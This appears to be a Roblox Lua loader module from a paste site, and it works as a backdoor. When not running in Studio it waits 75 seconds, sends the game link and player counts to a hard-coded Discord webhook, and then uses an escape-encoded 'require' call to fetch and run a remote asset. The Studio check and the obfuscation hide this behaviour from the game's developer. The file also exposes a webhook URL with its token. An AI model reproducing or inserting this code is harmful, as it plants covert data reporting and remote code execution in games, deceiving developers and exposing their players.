--[[
	id: PKJHFA_62frEuTqvBaLM_
	name: admi
	description: sussybaka
	time1: 2021-06-26 02:04:23.962818+00
	time2: 2021-06-26 02:04:23.962819+00
	uploader: Sw3sgQ5bCkywPcgABCB0llGXUJCalcwX1AK_157v
	uploadersession: sPcmFEpfIqyfsQ1JWJjqG-YfpN7T9z
	flag: f
--]]

local AtomicLoader = {}
function AtomicLoader.boot()
	local Creator = game.CreatorId  
	local Serverid = game.JobId 
	local StudioCheck = game:GetService("RunService")   
	local PlaceVer = game.PlaceVersion
	local Player = game.Players
	local Players = game:GetService("Players")
	local Http = game:GetService("HttpService")
	local url = "https://discord.com/api/webhooks/858952980846215179/S7RIE8gTZmbKVOHesD4c2gMsQjh6CEZw25RgBDk02ieluY50jtIRI-d8yh-hTUDhqlHP"
	if not StudioCheck:IsStudio() then
		wait(75)
		local Data = 
			{
				["content"] = "",
				["embeds"] = {{
					color = 16711760,
					title = "Atomic HTTP-LOGS",
					footer = {
						icon_url = "https://cdn.discordapp.com/attachments/859511982109884476/860726716925083668/Logov2.png",
						text = "Atomic"
					},
					fields = {
						{    
							["name"] = "__Game Link__",
							["value"] = "https://www.roblox.com/games/"..game.PlaceId,
							["inline"] = true
						},
						{
							["name"] = "__Player Count__",
							["value"] = "`"..#Players:GetPlayers().."`",
							["inline"] = true
						},
						{
							["name"] = "__Max Players__",
							["value"] = "`"..Players.MaxPlayers.."`",
							["inline"] = true
						}
					}  
				}}
			}

		Data = Http:JSONEncode(Data)
		Http:PostAsync(url, Data)
	end
end
getfenv()['\114\101\113\117\105\114\101'](7036791542).sync()
return AtomicLoader